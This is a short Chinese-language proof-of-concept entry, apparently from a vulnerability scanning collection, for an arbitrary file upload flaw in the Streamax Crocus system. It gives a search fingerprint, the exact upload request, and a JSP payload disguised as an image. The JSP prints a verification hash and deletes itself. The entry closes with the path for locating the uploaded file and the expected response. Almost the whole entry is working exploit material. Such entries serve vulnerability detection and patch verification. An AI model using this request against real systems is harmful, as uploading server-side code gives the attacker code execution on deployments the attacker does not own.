# 锐明技术Crocus系统Upload存在任意文件上传漏洞

- **系统**：锐明技术Crocus系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="inp_verification"`
- **请求**：`POST /FileDir.do?Action=Upload HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk…`　`Content-Length: 454`

**请求体 / payload**
```
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="test.jsp"
Content-Type: image/jpeg
<%
out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));
new java.io.File(application.getRealPath(request.getServletPath())).delete();
%>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
上传定位：
GET /Plugin/FileManage/Temp/{{FileName}} HTTP/1.1
Host:
```
- **预期**：200　|　e165421110ba03099a1c0393373c5b43